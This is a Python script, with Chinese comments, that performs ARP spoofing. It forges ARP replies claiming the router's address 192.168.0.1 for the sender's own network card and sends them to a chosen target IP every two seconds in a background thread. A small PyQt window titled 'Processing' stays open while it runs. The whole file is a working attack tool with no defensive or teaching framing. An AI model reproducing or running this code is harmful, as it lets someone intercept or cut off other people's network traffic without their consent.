import wmi
from scapy.all import (
    ARP,
    Ether,
    sendp,
    getmacbyip,
    get_if_hwaddr

)
import signal
import sys
from PyQt5.QtWidgets import QWidget, QPushButton, QApplication, QLabel, QFrame
from PyQt5.QtCore import QCoreApplication, Qt, QThread


def build_packet(TargetIp, GateWayAddr):
    print("[-] Obtaining mac from {}".format(TargetIp))  # 打印信息
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp)  # 获得ipd的mac地址
    MyMacAddr = get_if_hwaddr("WLAN")  # 获得我们网卡的mac地址
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr,
                                                        pdst=TargetIp)
    pkt.show()
    print(pkt)
    return pkt


def stop(signal, frame):
    sys.exit(0)


def gate(self):
    # 获取网关地址
    wmi_obj = wmi.WMI()
    wmi_sql = "select DefaultIPGateway from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE"
    wmi_out = wmi_obj.query(wmi_sql)
    for dev in wmi_out:
        gao = dev.DefaultIPGateway[0]
    return gao


class Example(QWidget):

    # print ("DefaultIPGateway:", dev.DefaultIPGateway[0])

    def __init__(self):
        super().__init__()

        self.initUI()

    def initUI(self):
        label = QLabel(self)
        label.resize(200, 100)
        label.setFrameStyle(QFrame.Panel | QFrame.Sunken)
        label.setText("点击X关闭程序")
        label.setAlignment(Qt.AlignBottom | Qt.AlignRight)
        self.setGeometry(300, 300, 250, 150)
        self.setWindowTitle('Processing')
        self.show()



class Thread(QThread):
    def __init__(self):
        super(Thread, self).__init__()
    def run(self):
        while True:
            sendp(packet, inter=2, iface="WLAN")  # inter表示发送包的间隔,iface表示我们的网卡

def ha(ipa):
    TargetIp = ipa  # 我ipad联网之后分配的ip
    GateWayAddr = "192.168.0.1"  # 路由器地址/网关地址
    signal.signal(signal.SIGINT, stop)
    global packet
    packet = build_packet(TargetIp, GateWayAddr)
    thread = Thread()
    thread.start()
    app = QApplication(sys.argv)
    ex = Example()
    sys.exit(app.exec_())
